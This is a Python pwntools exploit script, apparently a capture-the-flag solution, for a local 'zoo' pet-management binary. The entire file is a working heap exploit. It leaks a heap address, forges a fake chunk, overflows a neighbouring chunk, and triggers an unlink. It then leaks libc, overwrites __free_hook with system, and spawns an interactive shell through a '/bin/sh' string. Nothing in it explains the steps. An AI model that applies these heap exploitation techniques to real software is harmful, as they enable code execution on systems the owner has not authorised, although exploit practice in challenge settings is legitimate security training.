#usr/bin/python

from pwn import *

r = process('./zoo')
print util.proc.pidof(r)

def addname(name):
	r.recvuntil('>>')
	r.sendline(name)

def adopt(type,name):
	r.recvuntil('>>')
	r.sendline('1')
	r.recvuntil('>>')
	r.sendline(str(type))
	r.recvuntil('>>')
	r.send(name)

def feed(name):
	r.recvuntil('>>')
	r.sendline('2')
	r.recvuntil('>>')
	r.sendline(name)

def list(name):
	r.recvuntil('>>')
	r.sendline('6')
	r.recvuntil('>>')
	r.sendline(name)

def walk(name):
	r.recvuntil('>>')
	r.sendline('4')
	r.recvuntil('>>')
	r.sendline(name)

def takehospital(name):
	r.recvuntil('>>')
	r.sendline('5')
	r.recvuntil('>>')
	r.sendline(name)

def feedmedicine(animal,name,decription):
	r.recvuntil('>>')
	r.sendline('2')
	r.recvuntil('>>')
	r.sendline(animal)
	r.recvuntil('>>')
	r.send(name)
	r.recvuntil('>>')
	r.send(decription)

def clean(name):
	r.recvuntil('>>')
	r.sendline('3')
	r.recvuntil('>>')
	r.sendline(name)

fake_chunk_size = 0x8f0

#leak heap address
addname('/bin/sh')
adopt(1,'B'*20)
feed('B'*20)
r.recvuntil('animal ')
junk = r.recvn(20)
leak = u64(r.recvn(6).ljust(8,'\x00'))
log.info('heap leak is:%s' % hex(leak))
log.info('second animal address is:%s' % hex(leak-0x6d0))
log.info('third animal address is:%s' % hex(leak-0x6d0+0x1b0))

adopt(1,'orange\n')
adopt(2,'dk\n\x00'+p64(fake_chunk_size+1)+p64(leak+0xa20)) #fake fd
adopt(3,'ani\n')

# make orange ill
for i in range(5):
	feed('orange')

for i in range(9):
	walk('orange')
	feed('orange')

takehospital('orange')

# create two consecutive chunk
feed('ani')
feed('ani')

# free the first chunk
walk('ani')

# overflow the next chunk
payload = ''
payload += p64(0)*13
payload += p64(fake_chunk_size)
payload += p64(0x90)
feedmedicine('orange',p64(0x0),payload)

# make dk ill
for i in range(5):
	feed('dk')

for i in range(9):
	walk('dk')
	feed('dk')

for i in range(6):
	feed('dk')

takehospital('dk')

fake_chunk_addr = leak - 0x510
# set fake chunk fd->bk and bk->fd
feedmedicine('dk',p64(fake_chunk_addr),p64(fake_chunk_addr))
#feedmedicine('dk',p64(fake_chunk_addr),p64(fake_chunk_addr))

# trigger unlink
walk('ani')

#leak libc address
for i in range(4):
	feedmedicine('orange','AAA','BBB')

feedmedicine('orange',p64(leak-0x8b0),p64(0x0)) #make a valid heap to free
feedmedicine('orange',p64(leak-0x3e0),p64(leak-0x3e0))
list('dk')

r.recvuntil('Species :')
data = u64(r.recvuntil('\n').strip().ljust(8,'\x00'))
libc = data - 0x399b58
log.success('libc base is:%s' % hex(libc))
system_addr = libc + 0x3f450
log.success('system address is:%s' % hex(system_addr))
free_hook = libc + 0x39b788
log.success('free hook address is:%s' % hex(free_hook))

#overwrite part of dk heap and kali heap
feedmedicine('orange','AAA',p64(0)*6+p32(0x2)+p32(0x2)+p64(0x0)+p32(0x8)+p32(0x0)+p32(0x2)+p32(0x5)+p32(0xd)+p32(1)+p64(0x1)+p64(0x1b1))

feedmedicine('dk',p64(leak+0x990),p64(leak-0x338)+p64(free_hook-0x18))
feedmedicine('dk',p64(leak-0x3e0),p64(leak-0x3e0))
feedmedicine('orange','BBB',p64(0)*6+p32(0x2)+p32(0x2)+p64(0x0)+p32(0x10)+p32(0x1)+p32(0x2)+p32(0x5)+p32(0xd)+p32(1)+p64(0x1)+p64(0x1b1))

walk('ani')
r.recvuntil('>>')
r.sendline(p64(0)*14)
r.recvuntil('>>')
r.sendline(p64(system_addr))
r.recvuntil('>>')
r.sendline('bbb')

walk('dk')
walk('dk')

r.interactive()